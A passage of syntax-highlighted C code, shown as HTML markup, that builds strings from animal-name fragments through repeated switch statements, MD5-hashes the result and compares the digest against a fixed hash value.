punctuation\">;</span></pre></td></tr><tr><td data-num=\"462\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"463\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"464\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"465\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"466\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"467\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"468\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"469\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"470\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"471\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"472\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"473\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"474\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"475\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"476\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"477\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"478\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"479\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"480\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"481\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"482\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"483\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"484\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"485\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"486\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"487\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"488\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"489\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"490\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"491\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"492\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"493\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"494\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"495\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"496\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"497\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"498\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"499\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"500\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"501\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"502\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"503\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"504\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"505\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"506\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"507\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"508\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"509\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"510\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"511\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"512\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"513\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"514\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"515\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"516\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"517\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"518\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"519\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"520\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"521\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"522\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"523\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"524\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"525\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>iii<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"526\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"527\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"528\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"529\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"530\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"531\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"532\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"533\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"534\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"535\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"536\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"537\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"538\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"539\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"540\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"541\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"542\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"543\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"544\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"545\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"546\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"547\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"548\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"549\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"550\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"551\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"552\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"553\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"554\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"555\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"556\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"557\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"558\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"559\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"560\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"561\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"562\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"563\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"564\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"565\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"566\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"567\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"568\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> decrypt32<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"569\"></td><td><pre></pre></td></tr><tr><td data-num=\"570\"></td><td><pre>    MD5_CTX md5c<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"571\"></td><td><pre> <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"572\"></td><td><pre>     <span class=\"token function\">MD5Init</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 初始化</span></pre></td></tr><tr><td data-num=\"573\"></td><td><pre>     read_len <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>hexbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"574\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>hexbuf<span class=\"token punctuation\">,</span>read_len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"575\"></td><td><pre> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"576\"></td><td><pre>     <span class=\"token function\">MD5Final</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>md5c<span class=\"token punctuation\">,</span>decrypt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"577\"></td><td><pre></pre></td></tr><tr><td data-num=\"578\"></td><td><pre></pre></td></tr><tr><td data-num=\"579\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"580\"></td><td><pre>     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span>decrypt<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>ccmp<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token 